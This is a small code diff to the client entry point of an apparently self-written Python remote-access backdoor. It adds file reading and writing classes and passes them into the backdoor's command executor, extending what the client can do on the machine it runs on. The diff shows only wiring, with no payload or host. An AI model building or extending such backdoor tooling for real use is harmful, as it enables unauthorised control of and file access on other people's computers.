@@ -1,6 +1,8 @@
 import socket
 
 from backdoor.command.executor import CommandExecutor
+from backdoor.files.io import FileReader, FileWriter
+from backdoor.files.processor import FileProcessor
 from backdoor.messages.exchange.client import ClientExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
 from backdoor.messages.protocol import SocketProtocol
@@ -46,7 +48,10 @@ def main() -> None:
     protocol = SocketProtocol()
     serializer = JsonSerializer()
     messenger = SocketMessenger(protocol, serializer)
-    executor = CommandExecutor()
+    file_reader = FileReader()
+    file_writer = FileWriter()
+    file_processor = FileProcessor(file_writer, file_reader)
+    executor = CommandExecutor(file_processor)
     exchanger = ClientExchangeMapper(messenger, executor)
     client = Client(messenger, exchanger)
 
